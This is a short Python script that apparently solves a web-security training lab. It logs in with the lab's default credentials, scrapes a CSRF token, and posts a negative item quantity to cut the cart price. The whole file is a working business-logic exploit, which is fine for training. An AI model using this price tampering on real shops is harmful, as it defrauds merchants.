import requests, sys
from bs4 import BeautifulSoup

site = sys.argv[1]
if'https://' in site:
    site = site.rstrip('/').lstrip('https://')

url = f'https://{site}'

s = requests.Session()
site_url = f'https://{site}/product?productId=1'
resp = s.get(site_url)
login_url = f'https://{site}/login'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

logindata = {
    'csrf' : csrf,
    'username' : 'wiener',
    'password' : 'peter'
}
resp = s.post(login_url, data=logindata)

formData = {
  'productId': '1',
  'redir': 'CART',
  'quantity': '1',
  'formAction' : 'submit',
}
resp = s.post(site_url, data=formData)

formData2 = {
  'productId': '2',
  'redir': 'CART',
  'quantity': '-10',
  'formAction' : 'submit',
}
resp = s.post(site_url, data=formData2)
